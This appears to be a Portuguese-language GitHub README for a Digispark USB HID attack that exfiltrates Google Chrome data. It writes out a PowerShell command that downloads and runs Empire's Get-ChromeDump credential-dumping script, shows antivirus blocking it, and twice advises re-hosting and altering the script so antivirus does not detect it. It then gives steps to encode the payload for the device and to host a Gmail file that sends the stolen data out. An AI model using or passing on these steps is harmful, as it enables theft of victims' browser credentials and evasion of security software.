# Esse projeto é detectado pelo antivirus do windows pois muitas pessoas usaram o link padrão do GetChromeDump.ps1 diretamente do repositorio do EmpireProject, então baixe o GetChromeDump up em outro github e faça modificações no código para não ser detectado
PS C:\WINDOWS\system32> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ChromeDump.ps1'); Get-ChromeDump -OutFile 'C:\l\ChromeDump.txt'
IEX : No linha:1 caractere:1
+ Function Get-ChromeDump{
+ ~~~~~~~~~~~~~~~~~~~~~~~~
Este script contém conteúdo mal-intencionado e foi bloqueado pelo software antivírus.
No linha:1 caractere:1
+ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubuser ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand

Get-ChromeDump : O termo 'Get-ChromeDump' não é reconhecido como nome de cmdlet, função, arquivo de script ou programa
operável. Verifique a grafia do nome ou, se um caminho tiver sido incluído, veja se o caminho está correto e tente
novamente.
No linha:1 caractere:162
+ ... module_source/collection/Get-ChromeDump.ps1'); Get-ChromeDump -OutFil ...
+                                                    ~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Get-ChromeDump:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
    
# tente baixar o arquivo Get-ChromeDump.ps1 e upar em outro git, modifique algo no script (tipo os comentários) para não ser detectado pelo antivirus.


# Usando o digispark para exfiltrar dados do google chrome
this is a modified version from: https://github.com/cubidalsphere/Rubber-Ducky
you need to use https://github.com/mame82/duck2spark to encode digispark's payload

---

# vamos lá... 
para começar, vc precisa usar o duckencode e depois o duck2spark do mame82 (github mame82)

primeiro upa o arquivo referente à conexão com o gmail em algum free host... e configura ele tbm (né)

depois pega o payload .duck e usa o duckencoder (ta no git do mame82) nele:

**cat ~/payload.duck | python duckencoder.py -p -l br > inject.bin**

depois vc precisa usar o duck2spark (ta no git do mame82):

**./duck2spark.py -i inject.bin -l 1 -f 2000 -o inject.ino**

agora vc já tem o arquivo .ino é só subir pro digispark usando a IDE do arduino... (tem que baixar os drivers do digispark e tbm baixar a lib dele na ide do arduino)

se depois de tudo isso vc ainda não conseguir um payload funcional, esquece e vai estudar um pouco sobre arduino e HID antes de tentar isso...

[![VIDEO USANDO O DIGISPARK](https://static.makeuseof.com/wp-content/uploads/2015/12/youtube-player-670x335.jpg)](https://www.youtube.com/watch?v=py2dDVzWSw4)
